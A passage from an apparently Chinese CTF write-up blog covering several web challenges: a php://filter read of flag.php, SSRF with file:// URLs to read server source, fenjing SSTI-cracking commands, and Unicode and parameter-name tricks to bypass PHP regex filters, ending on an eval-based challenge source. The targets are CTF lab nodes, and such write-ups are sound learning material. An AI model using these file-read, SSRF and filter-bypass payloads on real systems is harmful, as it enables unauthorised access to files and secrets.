class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php&amp;a=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<br></code></pre></td></tr></table></figure><h1 id="LitCTF-2025-easy-signin"><a href="#LitCTF-2025-easy-signin" class="headerlink" title="[LitCTF 2025]easy_signin"></a>[LitCTF 2025]easy_signin</h1><p>开题先是无法访问，扫目录扫出这些：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[01:51:25] 301 -  169B  - /api  -&gt;  http://node6.anna.nssctf.cn/api/<br>[01:51:26] 301 -  169B  - /backup  -&gt;  http://node6.anna.nssctf.cn/backup/<br>[01:51:29] 302 -    0B  - /dashboard.php  -&gt;  /login.html<br>[01:51:34] 200 -    6KB - /login.html<br>[01:51:34] 200 -   51B  - /login.php<br></code></pre></td></tr></table></figure><p>访问login.php<br>回显：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">&#123;<span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-number">400</span>,<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-char escape_">\u</span>53c2<span class="hljs-char escape_">\u</span>6570<span class="hljs-char escape_">\u</span>4e0d<span class="hljs-char escape_">\u</span>5b8c<span class="hljs-char escape_">\u</span>6574&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>访问html<br>到一个登录界面  </p><p>抓包尝试了一下，发现username和password是md5加密过的</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/login.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>node6.anna.nssctf.cn:28934<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>107<br><span class="hljs-attribute">X-Sign</span><span class="hljs-punctuation">: </span>f6b57bb04015bf000f17e5d5dda37935<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://node6.anna.nssctf.cn:28934<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://node6.anna.nssctf.cn:28934/login.html<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_648a44a949074de73151ffaa0a832aec=1748528050<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-apache"><span class="hljs-attribute">username</span>=ee11cbb19052e40b07aac0ca060c23ee&amp;password=<span class="hljs-number">202</span>cb962ac59075b964b07152d234b70&amp;timestamp=<span class="hljs-number">1748714891098</span></span><br></code></pre></td></tr></table></figure><p>尝试对admin 密码爆破没结果<br>user 尝试一直提示账户错误没结果<br>去看wp<br>说是有api口能知道有地方能ssrf  </p><p>浏览器中f12查看网络去向能看到一个api地址  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://node6.anna.nssctf.cn:28934/api.js<br>访问看到：<br>/api/sys/urlcode.php?url=<br></code></pre></td></tr></table></figure><p>然后  </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>node6.anna.nssctf.cn:<span class="hljs-number">28934</span><span class="hljs-regexp">/api/</span>sys<span class="hljs-regexp">/urlcode.php?url=file:/</span><span class="hljs-regexp">//</span>var<span class="hljs-regexp">/www/</span>html/login.php<br><br>看不见哦<br></code></pre></td></tr></table></figure><p><a href="http://node6.anna.nssctf.cn:28934/api/sys/urlcode.php?url=file:///var/www/html/api/sys/urlcode.php">http://node6.anna.nssctf.cn:28934/api/sys/urlcode.php?url=file:///var/www/html/api/sys/urlcode.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!?php<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;<br>    <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br>&#125;<br><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$url</span>)&#123;<br><br>    <span class="hljs-variable">$forbidden_protocols</span> = [<span class="hljs-string">&#x27;ftp://&#x27;</span>, <span class="hljs-string">&#x27;php://&#x27;</span>, <span class="hljs-string">&#x27;zlib://&#x27;</span>, <span class="hljs-string">&#x27;data://&#x27;</span>, <span class="hljs-string">&#x27;glob://&#x27;</span>, <span class="hljs-string">&#x27;phar://&#x27;</span>, <span class="hljs-string">&#x27;ssh2://&#x27;</span>, <span class="hljs-string">&#x27;rar://&#x27;</span>, <span class="hljs-string">&#x27;ogg://&#x27;</span>, <span class="hljs-string">&#x27;expect://&#x27;</span>];<br>    <span class="hljs-variable">$protocol_block</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$forbidden_protocols</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$proto</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$url</span>, <span class="hljs-variable">$proto</span>) === <span class="hljs-number">0</span>) &#123;  <br>            <span class="hljs-variable">$protocol_block</span> = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$log_block</span> = <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$url</span>, <span class="hljs-string">&#x27;.log&#x27;</span>) !== <span class="hljs-literal">false</span>;  <br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$protocol_block</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;禁止访问：不允许使用 <span class="hljs-subst">&#123;$proto&#125;</span> 协议&quot;</span>;<br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$log_block</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;禁止访问：URL 包含 .log&quot;</span>;<br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$url</span>, <span class="hljs-string">&#x27;login.php&#x27;</span>) !== <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$url</span>, <span class="hljs-string">&#x27;dashboard.php&#x27;</span>) !== <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$url</span>, <span class="hljs-string">&#x27;327a6c4304ad5938eaf0efb6cc3e53dc.php&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;看不见哦&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;b--&gt;</span><br></code></pre></td></tr></table></figure><p>然后看到里面有个327a6c4304ad5938eaf0efb6cc3e53dc.php<br>在主解析访问直接得到flag  </p><p>看到有大佬写马的wp<br><a href="https://www.cnblogs.com/TouHp/p/18895822">https://www.cnblogs.com/TouHp/p/18895822</a><br>看不懂，先供着  </p><h1 id="LitCTF-2025-星愿信箱"><a href="#LitCTF-2025-星愿信箱" class="headerlink" title="[LitCTF 2025]星愿信箱"></a>[LitCTF 2025]星愿信箱</h1><p>原来这题直接用fenjing就能梭出来的，这倒是发现了我环境的问题<br>以前是直接在powershell 跑fenjing web ui 版，<br>一直跑不出来<br>去式了别人wp的fenjing指令也不行，<br>给d导看了，原来是powershell的字符需要转译  </p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig">原指令：  <br><span class="hljs-string">fenjing</span> <span class="hljs-string">crack-json</span> <span class="hljs-built_in">--url</span> <span class="hljs-string">&#x27;http://node6.anna.nssctf.cn:28919/&#x27;</span> <span class="hljs-built_in">--json-data</span> <span class="hljs-string">&#x27;&#123;&quot;cmd&quot;: &quot;a&quot;&#125;&#x27;</span> <span class="hljs-built_in">--key</span> <span class="hljs-string">cmd</span> <span class="hljs-built_in">--replaced-keyword-strategy</span> <span class="hljs-string">ignore</span>  <br>用不出来，一直提示报错  <br><br><span class="hljs-string">d</span>导给的命令:  <br><span class="hljs-string">fenjing</span> <span class="hljs-string">crack-json</span> <span class="hljs-built_in">--url</span> <span class="hljs-string">&#x27;http://node6.anna.nssctf.cn:28919/&#x27;</span> <span class="hljs-built_in">--json-data</span> <span class="hljs-string">&#x27;&#123;\&quot;cmd\&quot;: \&quot;a\&quot;&#125;&#x27;</span> <span class="hljs-built_in">--key</span> <span class="hljs-string">cmd</span> <span class="hljs-built_in">--replaced-keyword-strategy</span> <span class="hljs-string">ignore</span>    <br><br></code></pre></td></tr></table></figure><p>要不说以后fenjing在linux里跑？<br>没用，在Linux下跑的fenjing webui 还是无法成功<br>看来只能用命令跑了</p><h1 id="鹤城杯-2021-EasyP"><a href="#鹤城杯-2021-EasyP" class="headerlink" title="[鹤城杯 2021]EasyP"></a>[鹤城杯 2021]EasyP</h1><p>开题先见源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;utils.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$guess</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$guess</span> === <span class="hljs-variable">$secret</span>) &#123;<br>        <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="hljs-variable">$flag</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Wrong. Try Again&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/show_source/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show_source&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>只看一眼，看上去像是猜谜游戏，过滤了：<br>‘&#x2F;utils.php/*$&#x2F;i’<br>‘&#x2F;show_source&#x2F;‘   </p><p>但是又设置又’&#x2F;show_source&#x2F;‘成功传入后的结果，所以应该是能绕过正则过滤的<br>不管了，问ai  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 引入名为 utils.php 的文件，该文件可能包含一些辅助功能或变量定义。</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;utils.php&#x27;</span>;<br><br><span class="hljs-comment">// 判断是否存在名为 &#x27;guess&#x27; 的 POST 请求参数。</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>])) &#123;<br>    <span class="hljs-comment">// 将 POST 请求中的 &#x27;guess&#x27; 参数值强制转换为字符串类型，并赋值给变量 $guess。</span><br>    <span class="hljs-variable">$guess</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>];<br>    <span class="hljs-comment">// 判断用户提交的猜测值 $guess 是否与变量 $secret 相等。</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$guess</span> === <span class="hljs-variable">$secret</span>) &#123;<br>        <span class="hljs-comment">// 如果猜测正确，将提示信息和 $flag 变量的值拼接后赋值给 $message。</span><br>        <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="hljs-variable">$flag</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 如果猜测错误，提示用户重新尝试。</span><br>        <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Wrong. Try Again&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 检查当前脚本的路径是否以 &quot;utils.php&quot; 结尾（不区分大小写），如果是，则终止脚本运行，防止直接访问 utils.php 文件。</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// 检查请求的 URI 是否包含 &quot;show_source&quot; 字符串，如果是，则终止脚本运行，防止显示源代码。</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/show_source/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// 判断是否存在名为 &#x27;show_source&#x27; 的 GET 请求参数。</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show_source&#x27;</span>])) &#123;<br>    <span class="hljs-comment">// 如果存在，则使用 highlight_file 函数高亮显示当前脚本文件的代码，并终止脚本运行。</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">// 如果不存在 &#x27;show_source&#x27; GET 参数，则调用 show_source 函数（可能在 utils.php 中定义）显示当前脚本的源代码。</span><br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>basename($_SERVER[‘PHP_SELF’]) 是什么意思</strong><br>问了ai后<br>那我大概理解是返回当前客户请求的url的最后的文件名字，然后配合highlight_file显示源码  </p><p>所以是<br>先绕过  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 检查当前脚本的路径是否以 &quot;utils.php&quot; 结尾（不区分大小写），如果是，则终止脚本运行，防止直接访问 utils.php 文件。</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>看网上wp的办法是在url的实际路径上添加不影响路径解析的字符  </p><p>问ai找出能用的：  </p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs llvm">零宽度空格（Zero-Width Space）<br>编码：<span class="hljs-variable">%E2</span><span class="hljs-variable">%80</span><span class="hljs-variable">%8</span>B<br>描述：表示零宽度空格。<br>潜在影响：可能导致路径解析错误或绕过某些基于字符串匹配的安全检查。<br><br>其他 Unicode 空白字符<br>全角空格：<span class="hljs-variable">%EF</span><span class="hljs-variable">%BC</span><span class="hljs-variable">%A0</span>（全角空格）<br>半角空格：<span class="hljs-variable">%20</span>（普通空格）<br>中文标点符号：如 <span class="hljs-variable">%E3</span><span class="hljs-variable">%80</span><span class="hljs-variable">%81</span>（中文逗号）、<span class="hljs-variable">%E3</span><span class="hljs-variable">%80</span><span class="hljs-variable">%82</span>（中文句号）等<br>潜在影响：这些字符可能会被误认为普通空格或路径分隔符，从而绕过某些基于字符串匹配的安全检查。<br></code></pre></td></tr></table></figure><p>然后是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 检查请求的 URI 是否包含 &quot;show_source&quot; 字符串，如果是，则终止脚本运行，防止显示源代码。</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/show_source/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>的绕过<br>我看有wp是直接用<br>show+source直接绕过<br>问dp说不应该，正常是url编码下滑线来匹配显示源码的条件    </p><p><strong>继续追问:</strong><br>为什么这个转换会发生？<br>这是 PHP 的历史遗留行为（为了兼容 register_globals 时代），PHP 会自动转换参数名中的特定字符：</p><p>空格 → 下划线 _</p><p>点号 . → 下划线 _</p><p>其他特殊字符也会被转换</p><p>这是 PHP 的默认行为，可以在 php.ini 中通过 request_parameter_handling 配置，但默认是启用的。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>note-36</title>
    <link href="/2025/05/24/note-36/"/>
    <url>/2025/05/24/note-36/</url>
    
    <content type="html"><![CDATA[<h1 id="SWPUCTF-2021-新生赛-hardrce"><a href="#SWPUCTF-2021-新生赛-hardrce" class="headerlink" title="[SWPUCTF 2021 新生赛]hardrce"></a>[SWPUCTF 2021 新生赛]hardrce</h1><p>开局给源码，只看一眼  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wllm&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$wllm</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wllm&#x27;</span>];<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;\t&#x27;</span>,<span class="hljs-string">&#x27;\r&#x27;</span>,<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\+&#x27;</span>,<span class="hljs-string">&#x27;\[&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>,<span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\&quot;&#x27;</span>,<span class="hljs-string">&#x27;\-&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\*&#x27;</span>,<span class="hljs-string">&#x27;\?&#x27;</span>,<span class="hljs-string">&#x27;\&lt;&#x27;</span>,<span class="hljs-string">&#x27;\&gt;&#x27;</span>,<span class="hljs-string">&#x27;\=&#x27;</span>,<span class="hljs-string">&#x27;\`&#x27;</span>,];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$wllm</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span>);<br>    &#125;&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="hljs-variable">$wllm</span>))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$wllm</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;蔡总说：注意审题！！！&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> 